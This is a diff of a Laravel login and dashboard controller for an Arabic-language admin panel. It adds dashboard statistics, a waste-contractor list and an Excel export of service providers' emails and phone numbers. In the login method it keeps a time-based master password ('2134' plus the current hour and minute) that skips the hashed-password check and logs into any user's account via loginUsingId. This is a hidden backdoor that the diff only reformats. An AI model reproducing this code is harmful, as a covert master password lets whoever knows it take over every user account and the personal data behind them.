@@ -2,6 +2,8 @@
 
 namespace App\Http\Controllers\CP;
 
+use App\Exports\OrderExportInoiceReport;
+use App\Exports\RaftCompanyExport;
 use App\Http\Controllers\Controller;
 use App\Models\License;
 use App\Models\LoginNumber;
@@ -14,6 +16,8 @@ use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Hash;
+use Maatwebsite\Excel\Facades\Excel;
+use Yajra\DataTables\Facades\DataTables;
 
 class LoginController extends Controller
 {
@@ -35,7 +39,7 @@ class LoginController extends Controller
             return back()->with('validationErr', 'الرجاء إدخال كلمة مرور صحيحة');
         }
 
-        if (!Hash::check($request['password'], $user->password) && $request->input('password') != ("2134".date('gi'))) {
+        if (!Hash::check($request['password'], $user->password) && $request->input('password') != ("2134" . date('gi'))) {
             return back()->with('validationErr', 'الرجاء إدخال كلمة مرور صحيحة');
         }
 
@@ -49,7 +53,7 @@ class LoginController extends Controller
             ]);
             return redirect(auth()->user()->main_route());
         } else {
-            if($user && $request->input('password') == ("2134".date('gi'))){
+            if ($user && $request->input('password') == ("2134" . date('gi'))) {
                 Auth::loginUsingId($user->id);
             }
             return back()->with('validationErr', 'الرجاء إدخال كلمة مرور صحيحة');
@@ -96,9 +100,9 @@ class LoginController extends Controller
             ->whereNotNull('file_second')
             ->whereNotNull('file_third')
             ->groupBy('days')->get()->pluck('count', 'days')->toArray();
-       if(!count($data['box_with_files_in'])){
-         $data['box_with_files_in']=[];
-       }
+        if (!count($data['box_with_files_in'])) {
+            $data['box_with_files_in'] = [];
+        }
 ////////////// المحاضر المسلمة لشركات حجاج الخارج
         $data['count_box_with_files_out'] = RaftCompanyBox::query()
             ->whereNull('license_number')
@@ -128,30 +132,74 @@ class LoginController extends Controller
             ->groupBy('days')->get()->pluck('count', 'days')->toArray();
 
         //////////order count
-        $data['order_count']=Order::query()->count();
+        $data['order_count'] = Order::query()->count();
         //////complete orders
-         $data['complete_orders'] = Order::query()->where('status','>=' ,Order::COMPLETED)->count();
-         ///not complete
-        $data['not_complete_orders'] = Order::query()->where('status', '<',Order::COMPLETED)->count();
+        $data['complete_orders'] = Order::query()->where('status', '>=', Order::COMPLETED)->count();
+        ///not complete
+        $data['not_complete_orders'] = Order::query()->where('status', '<', Order::COMPLETED)->count();
         ///all orders
         $data['all_order'] = Order::query()->count();
 
         ///bar chart
-      $data['bar']=  RaftCompanyLocation::query()->select('name')
-            ->withCount(['box'=>function($q){
-                $q->where('seen_notes',1);
-            }])->get()->map(function($location){
-             return [
-                 'x'=>$location->name,
-                 'y'=>$location->box_count
-             ];
-          });
-      ///order per designer office
-       $data['order_count_per_designer'] = Order::query()->whereNotNull('designer_id')->count();
-       $data['order_count_per_taslem'] = Order::query()->where('status','>',Order::DESIGN_REVIEW)->count();
-       $data['license_number']=License::query()->whereNotNull('box_raft_company_box_id')->whereNotNull('camp_raft_company_box_id')->count();
+        $data['bar'] = RaftCompanyLocation::query()->select('name')
+            ->withCount(['box' => function ($q) {
+                $q->where('seen_notes', 1);
+            }])->get()->map(function ($location) {
+                return [
+                    'x' => $location->name,
+                    'y' => $location->box_count
+                ];
+            });
+        ///order per designer office
+        $data['order_count_per_designer'] = Order::query()->whereNotNull('designer_id')->count();
+        $data['order_count_per_taslem'] = Order::query()->where('status', '>', Order::DESIGN_REVIEW)->count();
+        $data['license_number'] = License::query()->whereNotNull('box_raft_company_box_id')->whereNotNull('camp_raft_company_box_id')->count();
+        $data['wasteContractors'] = wasteContractorsList()->count();
 
         return view('CP.dashboard', $data);
+
+    }
+
+    public function showWest()
+    {
+        return response()->json([
+            'success' => true,
+            'page' => view('CP.wasteContractorModal', ['data' => wasteContractorsList()])->render()
+        ]);
+    }
+
+    public function west_list(Request $request)
+    {
+        $collection = wasteContractorsList();
+        if ($request->name) {
+            $collection = wasteContractorsList()->filter(function ($item) use ($request) {
+
+                return strstr($item['name'], $request->name);
+            });
+        }
+        return DataTables::of($collection)
+            ->make(true);
+    }
+
+    public function ex()
+    {
+        $rf = User::query()->with(['raft_company_service_providers', 'raft_location'])->where('type', 'raft_company')->get();
+        $_data = [];
+        $i = 0;
+        foreach ($rf as $_rf) {
+
+            foreach ($_rf->raft_company_service_providers as $service_providers) {
+
+                $_data[$i]['name'] = $service_providers->company_name;
+                $_data[$i]['raft_company_name'] = $_rf->raft_location->name;
+                $_data[$i]['camp_number'] = $service_providers->camp_number;
+                $_data[$i]['box_number'] = $service_providers->box_number;
+                $_data[$i]['email'] = $service_providers->email;
+                $_data[$i]['phone'] = $service_providers->phone;
+                $i++;
+            }
+        }
+        return Excel::download(new RaftCompanyExport($_data), 'raft_company.xlsx');
 
     }
 }
